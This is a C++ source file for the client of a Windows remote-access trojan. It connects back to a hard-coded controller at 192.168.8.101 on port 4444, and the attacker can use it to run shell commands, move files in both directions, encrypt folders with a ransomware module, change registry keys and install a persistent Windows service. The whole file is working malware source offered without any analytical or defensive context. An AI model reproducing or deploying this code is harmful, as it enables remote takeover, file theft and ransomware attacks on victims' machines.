#define _WIN32_WINDOWS 0x0A00
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <boost/format.hpp>
#include "Client.h"
#include "NetworkExcetion.hpp"
#include "CommandExecuter.h"
#include "Registry.h"
#include "WindowsService.h"
#include "Ransomware.h"

Client::Client()
	: ReverseShellStandard()
{
	Connect();
	Start();
	m_ioService.run();
}

void Client::Connect() 
{
	using TcpResolver = boost::asio::ip::tcp::resolver;
	TcpResolver resolver(m_ioService);
	auto endpointIterator = resolver.resolve({ "192.168.8.101", "4444" }); //192.168.8.101

	while (true)
	{
		boost::asio::connect(m_socket, endpointIterator, m_errorCode);
		if (!m_errorCode)
			return;

		std::cout << "Coudn't connect to server. Check that it is up and listening " << std::endl;
		m_socket.close();
		std::this_thread::sleep_for(std::chrono::seconds(3));
	}

	std::cout << "Connected to: " << m_socket.remote_endpoint().address().to_string() << std::endl;
}

void Client::Start()
{
	while (true)
	{
		switch (ReadOperationType())
		{
		case RUN_COMMAND:
			RunCommand();
			break;
		case DOWNLOAD_FILE:
			UploadFile();
			break;
		case UPLOAD_FILE:
			DownloadFile();
			break;
		case RANSOMWARE:
			RunRansomware();
			break;
		case REGISTRY_OPERATION:
			AccessRegistry();
			break;
		case PERSISTENCE:
			CreatePersistence();
			break;
		default:
			InvalidOperation();
			break;
		}

		m_responseBuf.consume(m_responseBuf.size());
	}
}

Client::OperationType Client::ReadOperationType() 
{
	auto operation = Response();
	return GetOperationType(operation);
}

void Client::RunCommand()
{
	auto command = Response();
	std::cout << "Command to Run: " << command << std::endl;
	auto commandResult = RunShellCommand(command);
	std::cout << "Command Result: " << commandResult << std::endl;
	Send(commandResult);
}

std::string Client::RunShellCommand(const std::string& command)
{
	std::string commandResult;
	try
	{
		CommandExecuter commandExecuter;
		commandResult = commandExecuter.RunShellCommand(command);
	}
	catch (const boost::process::process_error& ex)
	{
		if (ex.code().value() != CommandExecuter::ShellCommandErrorCode)
			throw boost::process::process_error(ex);

		commandResult = (boost::format("Running command failed! \nError Code: %1% \nError Message: %2%") % ex.code().value() % ex.what()).str();
	}

	return std::move(commandResult);
}

void Client::UploadFile()
{
	auto localFilePath = Response();
	std::cout << "File that server wants: " << localFilePath << std::endl;
	if (!TellServerIfFileExists(localFilePath))
		return;

	ReverseShellStandard::UploadFile(localFilePath);
	std::cout << "File uploaded (local): " << localFilePath << std::endl;
}

void Client::DownloadFile()
{
	auto filePath = Response();
	std::cout << "Where to store the uploaded file: " << filePath << std::endl;
	TellServerIfFileExists(filePath);
	OpenFileFor(filePath, std::ios::out | std::ios::binary);
	ReverseShellStandard::DownloadFile(filePath);
}

bool Client::TellServerIfFileExists(const std::string& filePath)
{
	auto fileExists = IsRegularFileExists(filePath);
	Send(fileExists);
	return fileExists;
}

void Client::InvalidOperation()
{
	throw NetworkExcetion("The server sent an invalid request. Reconnecting...");
}

void Client::RunRansomware()
{
	auto operation = Response();
	auto startFolder = Response();

	auto folderExists = std::filesystem::exists(startFolder);
	Send(folderExists);
	if (!folderExists)
		return;

	auto numberOfFilesCrypted = StartRansomware(operation, startFolder);
	Send((boost::format("Number of files Crypted: %1%") % numberOfFilesCrypted).str());
}

long Client::StartRansomware(const std::string& operation, const std::string& startFolder)
{
	if (operation == "1")
		return Ransomware(startFolder, Ransomware::Encrypt).Start();
	else	 
		return Ransomware(startFolder, Ransomware::Decrypt).Start();
}

void Client::AccessRegistry()
{
	auto operation = Response();
	auto registryKeyPath = Response();

	auto registry = Registry(registryKeyPath);
	auto message = (registry.m_IsKeyCreated) ? "The key was created" : "The key was opened";
	Send(message);

	auto registryValue = Response();
	std::string registyData;
	if (operation == "1")
		registyData = registry.QueryValue(registryValue);
	else
	{
		registyData = Response();
		registry.SetValue(registryValue, registyData);
	}

	auto summary = (boost::format("Key: %1% \nValue: %2% \nData: %3%") % registryKeyPath % registryValue % registyData).str();
	Send(summary);
}

void Client::CreatePersistence()
{
	WindowsServices windowsServices;
	windowsServices.CreateWindowsService();
	Send("Service Created");
}
